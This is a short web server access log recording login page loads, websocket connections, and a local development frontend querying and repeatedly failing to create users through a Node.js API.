118.68.26.235 - - [14/Apr/2025:06:18:25 +0000] "GET /ws HTTP/1.1" 101 2172 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0"
118.68.26.235 - - [14/Apr/2025:06:18:25 +0000] "GET /static/js/bundle.js HTTP/1.1" 304 0 "http://fams.io.vn/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0"
118.68.26.235 - - [14/Apr/2025:06:18:25 +0000] "GET /favicon.ico HTTP/1.1" 304 0 "http://fams.io.vn/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0"
118.68.26.235 - - [14/Apr/2025:06:18:25 +0000] "GET /login HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0"
118.68.26.235 - - [14/Apr/2025:06:18:26 +0000] "GET /ws HTTP/1.1" 101 2170 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0"
118.68.26.235 - - [14/Apr/2025:06:18:26 +0000] "GET /static/js/bundle.js HTTP/1.1" 304 0 "http://fams.io.vn/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0"
118.68.26.235 - - [14/Apr/2025:06:18:27 +0000] "GET /favicon.ico HTTP/1.1" 304 0 "http://fams.io.vn/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0"
116.96.77.176 - - [14/Apr/2025:06:19:12 +0000] "OPTIONS /api-nodejs/users?page=1&search=&grade=&roles=&className=&limit=500&phone= HTTP/1.1" 204 0 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.176 - - [14/Apr/2025:06:19:15 +0000] "GET /api-nodejs/users?page=1&search=&grade=&roles=&className=&limit=500&phone= HTTP/1.1" 200 298123 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.176 - - [14/Apr/2025:06:25:31 +0000] "OPTIONS /api-nodejs/users/create HTTP/1.1" 204 0 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.176 - - [14/Apr/2025:06:25:32 +0000] "POST /api-nodejs/users/create HTTP/1.1" 500 116 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.176 - - [14/Apr/2025:06:26:50 +0000] "OPTIONS /api-nodejs/users/create HTTP/1.1" 204 0 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.176 - - [14/Apr/2025:06:26:51 +0000] "POST /api-nodejs/users/create HTTP/1.1" 500 138 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.176 - - [14/Apr/2025:06:27:14 +0000] "OPTIONS /api-nodejs/users/create HTTP/1.1" 204 0 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.176 - - [14/Apr/2025:06:27:14 +0000] "POST /api-nodejs/users/create HTTP/1.1" 500 116 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
